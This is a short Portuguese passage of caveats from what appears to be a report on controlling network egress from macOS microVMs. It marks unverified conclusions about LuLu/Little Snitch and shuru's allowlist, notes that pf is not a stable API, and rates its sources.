- **"Não verificado" explícito:** o comportamento de LuLu/Little Snitch perante microVMs do Virtualization.framework **não** tem teste publicado; a conclusão de que não é o ponto de controle é inferência forte a partir de (i) limitações documentadas pela Apple para interfaces virtuais, (ii) o padrão observado com VMware `vmnet-natd`, e (iii) a NAT em kernel do vmnet. O mecanismo exato de allowlist do `shuru --allow-net` também não está documentalmente confirmado.
- **`pf` não é API** (Apple TN3165): funciona, mas sem garantia de estabilidade entre versões; trate como configuração de máquina própria a revalidar a cada update.
- **Fontes de qualidade variável:** dados de arquitetura vêm de docs da Apple, Objective-See/DeepWiki, obdev, GitHub oficial (shuru, sandbox-runtime, Santa) e fóruns Apple; alguns pontos de comportamento com VM vêm de relatos de usuário (VMware) e devem ser lidos como tal.
- **Distinção fornecedor/usuário/inferência** foi mantida ao longo do texto; onde marquei "não verificado", trate como hipótese a testar com o checklist, não como fato estabelecido.